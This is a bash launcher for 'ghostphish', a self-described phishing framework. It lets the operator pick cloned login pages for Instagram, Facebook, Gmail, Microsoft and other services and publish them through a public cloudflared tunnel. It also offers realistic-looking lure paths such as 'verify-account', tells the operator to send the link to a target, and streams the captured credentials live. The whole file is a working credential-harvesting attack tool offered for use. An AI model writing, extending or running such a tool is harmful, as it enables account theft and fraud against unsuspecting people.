#!/usr/bin/env bash
#
# ghostphish — interactive CLI launcher (zphisher-style)
# Developed by Yaman.RedTeam
#

set -o pipefail

# ─── Colors ───────────────────────────────────────
R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
C='\033[0;36m'
B='\033[1;34m'
M='\033[0;35m'
W='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
N='\033[0m'

PORT=8000
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
LOG_FILE="/tmp/ghostphish_tunnel.log"
PID_FILE="/tmp/ghostphish_tunnel.pid"

# ─── Templates ────────────────────────────────────
declare -a TEMPLATES=(
    "instagram|Instagram|Dark theme, 'close friends' hero"
    "facebook|Facebook|White bg, photo cards, real logos"
    "netflix|Netflix|Dark hero, red wordmark"
    "twitter|Twitter / X|Black bg, huge X logo, SSO buttons"
    "linkedin|LinkedIn|Beige bg, professional style"
    "snapchat|Snapchat|Yellow header, ghost logo"
    "microsoft|Microsoft|Cosmic dark bg, 2-step OAuth"
    "gmail|Gmail|Dark theme, colored G, 2-step flow"
)

# ─── Helpers ──────────────────────────────────────
banner() {
    clear
    echo -e "${R}"
    echo -e "   █▀▀ █░█ █▀█ █▀ ▀█▀ █▀█ █░█ █ █▀ █░█ █▀▀ █▀█"
    echo -e "   █▄█ █▀█ █▄█ ▄█ ░█░ █▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄"
    echo -e "${N}   ${Y}⚡ modern phishing framework${N}  ${DIM}v1.0.0${N}"
    echo -e "   ${C}Developed by ${R}${BOLD}Yaman.RedTeam${N}  ${DIM}·${N}  ${DIM}github.com/Yaman-RedTeam/ghostphish${N}"
    echo -e "   ${DIM}────────────────────────────────────────────────────────${N}\n"
}

msg_ok()   { echo -e "  ${G}[✓]${N} $*"; }
msg_err()  { echo -e "  ${R}[✗]${N} $*"; }
msg_info() { echo -e "  ${C}[i]${N} $*"; }
msg_warn() { echo -e "  ${Y}[!]${N} $*"; }

pause_for() {
    echo ""
    read -rp "  $(echo -e ${DIM})Press Enter to continue$(echo -e ${N})" _
}

# ─── Dependency checks ────────────────────────────
check_deps() {
    local missing=()
    command -v docker >/dev/null 2>&1 || missing+=("docker")
    (command -v docker-compose >/dev/null 2>&1 || docker compose version >/dev/null 2>&1) || missing+=("docker-compose")

    if [ ${#missing[@]} -ne 0 ]; then
        msg_err "Missing dependencies: ${missing[*]}"
        msg_info "Install docker + docker-compose, then re-run."
        exit 1
    fi

    if ! docker info >/dev/null 2>&1; then
        msg_err "Docker daemon not running — start it first."
        exit 1
    fi
}

# ─── Container mgmt ───────────────────────────────
is_running() {
    curl -s -o /dev/null -w "%{http_code}" "http://localhost:${PORT}/health" 2>/dev/null | grep -q "200"
}

start_container() {
    if is_running; then
        msg_ok "ghostphish already running on port ${PORT}"
        return 0
    fi
    msg_info "Starting Docker container..."
    (cd "$SCRIPT_DIR" && docker-compose up -d --build 2>&1) | tail -3
    sleep 3
    if is_running; then
        msg_ok "Container up on http://localhost:${PORT}"
    else
        msg_err "Container failed to start. Check: docker logs ghostphish"
        exit 1
    fi
}

# ─── Cloudflared tunnel ───────────────────────────
start_tunnel() {
    if ! command -v cloudflared >/dev/null 2>&1; then
        msg_warn "cloudflared not installed — falling back to localhost."
        msg_info "Install: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/"
        echo ""
        TUNNEL_URL="http://localhost:${PORT}"
        return 1
    fi

    msg_info "Starting cloudflared quick-tunnel..."
    pkill -f "cloudflared tunnel" 2>/dev/null
    sleep 1
    : > "$LOG_FILE"

    cloudflared tunnel --url "http://localhost:${PORT}" > "$LOG_FILE" 2>&1 &
    TUNNEL_PID=$!
    echo $TUNNEL_PID > "$PID_FILE"

    TUNNEL_URL=""
    for _ in {1..30}; do
        TUNNEL_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$LOG_FILE" | head -1)
        [[ -n "$TUNNEL_URL" ]] && break
        sleep 1
    done

    if [[ -z "$TUNNEL_URL" ]]; then
        msg_err "Tunnel failed to start. Check $LOG_FILE"
        TUNNEL_URL="http://localhost:${PORT}"
        return 1
    fi

    msg_ok "Tunnel active: ${B}${TUNNEL_URL}${N}"
    return 0
}

# ─── Template menu ────────────────────────────────
show_menu() {
    banner
    echo -e "  ${W}${BOLD}Choose a phishing template:${N}\n"
    local i=1
    for t in "${TEMPLATES[@]}"; do
        IFS='|' read -r slug name desc <<< "$t"
        printf "   ${Y}[%2d]${N}  ${W}%-14s${N} ${DIM}%s${N}\n" "$i" "$name" "$desc"
        i=$((i+1))
    done
    echo ""
    printf "   ${Y}[ 0]${N}  ${R}Exit${N}\n"
    echo ""
    echo -e "  ${DIM}────────────────────────────────────────────────────────${N}"
}

pick_template() {
    while true; do
        show_menu
        echo ""
        read -rp "  $(echo -e ${G})ghostphish${N} > " choice
        if [[ "$choice" == "0" ]]; then
            echo -e "\n  ${DIM}Bye.${N}\n"
            exit 0
        fi
        if [[ "$choice" =~ ^[1-9][0-9]*$ ]] && (( choice >= 1 && choice <= ${#TEMPLATES[@]} )); then
            IFS='|' read -r SEL_SLUG SEL_NAME SEL_DESC <<< "${TEMPLATES[$((choice-1))]}"
            return 0
        fi
        msg_err "Invalid choice — enter a number from the menu."
        sleep 1
    done
}

# ─── Delivery mode menu ───────────────────────────
pick_mode() {
    banner
    echo -e "  Selected: ${W}${BOLD}${SEL_NAME}${N}\n"
    echo -e "  ${W}${BOLD}Choose delivery mode:${N}\n"
    printf "   ${Y}[1]${N}  ${W}Cloudflared tunnel${N}   ${DIM}(public HTTPS URL, no account)${N}\n"
    printf "   ${Y}[2]${N}  ${W}Localhost only${N}       ${DIM}(for local testing / same-machine target)${N}\n"
    printf "   ${Y}[0]${N}  ${R}Back${N}\n"
    echo ""
    echo -e "  ${DIM}────────────────────────────────────────────────────────${N}"
    echo ""
    read -rp "  $(echo -e ${G})mode${N} > " mode_choice
    case "$mode_choice" in
        1) DELIVERY="tunnel" ;;
        2) DELIVERY="local" ;;
        0) return 1 ;;
        *) msg_err "Invalid choice"; sleep 1; return 1 ;;
    esac
    return 0
}

# ─── Custom URL path ──────────────────────────────
pick_url_path() {
    banner
    echo -e "  Selected: ${W}${BOLD}${SEL_NAME}${N}   Mode: ${W}${DELIVERY}${N}\n"
    echo -e "  ${W}${BOLD}Choose URL path:${N}\n"
    printf "   ${Y}[1]${N}  ${W}Default${N}                 ${DIM}/${SEL_SLUG}${N}\n"
    printf "   ${Y}[2]${N}  ${W}Custom path (looks real)${N}  ${DIM}e.g. ${SEL_SLUG}login, verify-account${N}\n"
    printf "   ${Y}[3]${N}  ${W}Quick suggestions${N}       ${DIM}pick from realistic-looking presets${N}\n"
    printf "   ${Y}[0]${N}  ${R}Back${N}\n"
    echo ""
    echo -e "  ${DIM}────────────────────────────────────────────────────────${N}"
    echo ""
    read -rp "  $(echo -e ${G})path${N} > " path_choice

    case "$path_choice" in
        1) URL_PATH="$SEL_SLUG" ;;
        2)
            echo ""
            echo -e "  ${DIM}Enter custom path (letters, digits, - only). Ex: ${SEL_SLUG}-login-verify${N}"
            read -rp "  $(echo -e ${G})custom${N} > " URL_PATH
            URL_PATH=$(echo "$URL_PATH" | tr '[:upper:]' '[:lower:]' | tr -c 'a-z0-9-' '-' | sed 's/^-*//; s/-*$//')
            if [[ -z "$URL_PATH" ]]; then
                msg_err "Empty path"; sleep 1; return 1
            fi
            register_alias "$URL_PATH" "$SEL_SLUG" || return 1
            ;;
        3)
            banner
            echo -e "  Presets for ${W}${SEL_NAME}${N}:\n"
            local -a PRESETS=(
                "${SEL_SLUG}login"
                "${SEL_SLUG}-login"
                "login-${SEL_SLUG}"
                "verify-${SEL_SLUG}"
                "${SEL_SLUG}-verify-account"
                "secure-${SEL_SLUG}"
                "${SEL_SLUG}-account-verify"
                "auth-${SEL_SLUG}"
            )
            local i=1
            for p in "${PRESETS[@]}"; do
                printf "   ${Y}[%d]${N}  ${W}%s${N}\n" "$i" "$p"
                i=$((i+1))
            done
            echo ""
            read -rp "  $(echo -e ${G})preset${N} > " ps
            if [[ "$ps" =~ ^[1-9][0-9]*$ ]] && (( ps >= 1 && ps <= ${#PRESETS[@]} )); then
                URL_PATH="${PRESETS[$((ps-1))]}"
                register_alias "$URL_PATH" "$SEL_SLUG" || return 1
            else
                msg_err "Invalid"; sleep 1; return 1
            fi
            ;;
        0) return 1 ;;
        *) msg_err "Invalid"; sleep 1; return 1 ;;
    esac
    return 0
}

register_alias() {
    local path="$1"
    local tpl="$2"
    local resp
    resp=$(curl -s -X POST "http://localhost:${PORT}/admin/aliases" \
        -H "Content-Type: application/json" \
        -d "{\"path\":\"${path}\",\"template\":\"${tpl}\"}")
    if echo "$resp" | grep -q '"success":true'; then
        msg_ok "Alias registered: /${path} → ${tpl}"
        sleep 1
        return 0
    else
        msg_err "Failed to register alias: $resp"
        sleep 2
        return 1
    fi
}

# ─── Result screen ────────────────────────────────
show_link() {
    banner
    echo -e "  ${G}${BOLD}✓ READY${N}\n"
    echo -e "  Template:  ${W}${SEL_NAME}${N}  ${DIM}(${SEL_DESC})${N}"
    echo -e "  Mode:      ${W}${DELIVERY}${N}\n"

    local full_url="${TUNNEL_URL}/${URL_PATH:-$SEL_SLUG}"
    echo -e "  ${Y}════════════════════════════════════════════════════════${N}"
    echo -e "  ${W}Send this link to the target:${N}"
    echo ""
    echo -e "  ${B}${BOLD}${full_url}${N}"
    echo ""
    echo -e "  ${Y}════════════════════════════════════════════════════════${N}\n"

    echo -e "  ${DIM}Admin captures:${N}   ${C}${TUNNEL_URL}/admin/captures${N}"
    echo -e "  ${DIM}Live stats:${N}        ${Y}python3 stats.py${N}"
    echo -e "  ${DIM}Export CSV:${N}        ${Y}python3 export_captures.py csv${N}"
    if [[ "$DELIVERY" == "tunnel" ]]; then
        echo -e "  ${DIM}Tunnel log:${N}        ${Y}tail -f ${LOG_FILE}${N}"
    fi
    echo ""

    echo -e "  ${W}${BOLD}Live capture stream${N} ${DIM}(Ctrl+C to stop)${N}\n"
    echo -e "  ${DIM}Waiting for target submissions...${N}\n"

    # Reliable Python watcher — polls admin API every 2s
    python3 "${SCRIPT_DIR}/watch_captures.py"
}

# ─── Main flow ────────────────────────────────────
main() {
    banner
    msg_info "Checking dependencies..."
    check_deps
    msg_ok "docker + docker-compose present"

    if command -v cloudflared >/dev/null 2>&1; then
        msg_ok "cloudflared present ($(cloudflared --version 2>&1 | head -1 | awk '{print $3}'))"
    else
        msg_warn "cloudflared not installed (localhost-only mode available)"
    fi
    sleep 1

    start_container

    while true; do
        pick_template
        if pick_mode; then
            URL_PATH=""
            if ! pick_url_path; then continue; fi
            if [[ "$DELIVERY" == "tunnel" ]]; then
                banner
                start_tunnel
            else
                TUNNEL_URL="http://localhost:${PORT}"
            fi
            show_link
        fi
    done
}

main "$@"
